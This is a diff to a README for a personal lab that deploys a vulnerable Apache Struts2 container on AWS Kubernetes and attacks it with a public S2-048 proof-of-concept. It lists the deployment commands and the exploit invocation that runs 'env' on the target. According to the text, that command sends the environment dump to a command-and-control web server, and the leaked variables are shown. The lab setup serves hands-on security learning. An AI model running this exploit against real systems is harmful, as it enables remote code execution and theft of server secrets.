@@ -10,13 +10,16 @@ all credit to https://github.com/hook-s3c/apache-struts2-PoC, all I did was make
 ![image](https://user-images.githubusercontent.com/4404271/155650062-66a0d0e0-5091-4dd0-9eb9-cb125d21dddb.png)
 
 
+`Here's a bit of a reminder to myself for how I did this:`    
 
 git clone https://github.com/hook-s3c/apache-struts2-PoC  
 cd apache-struts2-PoC/  
 docker build -t struts .  
 docker run -it --rm -d -p 8080:8080 struts:latest  
 docker tag struts:latest public.ecr.aws/v9f6i2g3/stuff:latest  
-#public login to us-west-2 not supported by aws  
+
+#public login to us-west-2 not supported by aws, no worries it's supported in us-east-1 so let's just do it there ;-)  
+
 aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws  
 docker push public.ecr.aws/v9f6i2g3/stuff:latest  
 kubectl apply -f strust-deploy-and-service.yaml  
@@ -25,14 +28,14 @@ ubuntu@brett-jumpbox:myhomedir/apache-struts2-PoC
 
 kubectl get service -n struts  
 NAME     TYPE           CLUSTER-IP       EXTERNAL-IP                                                              PORT(S)          AGE  
-`struts   LoadBalancer   10.100.144.108   a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m` 
+`struts   LoadBalancer   10.100.144.108   12345.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m` 
 
 First, on the cc server, start some simple web server such as: python3 webserver.py  
 
 OK now we can attack, from the attacker "box" (actually just a tmux on my ubuntu box):  
 
 `cd ~/apache-struts2-PoC`    
-`python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'`  
+`python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'env'`  
 
 ...and we dump the environment to the CC server, not good!  
 
@@ -42,7 +45,7 @@ STRUTS_PORT_8080_TCP_PORT=8080
 STRUTS_SERVICE_PORT=8080  
 HOSTNAME=struts-7d8c95bbbd-9p9pp  
 JAVA_HOME=/usr/local/openjdk-8  
-GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5  
+GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42
 etc..  
   
 OK that was fun, what else can we do? Curl?  
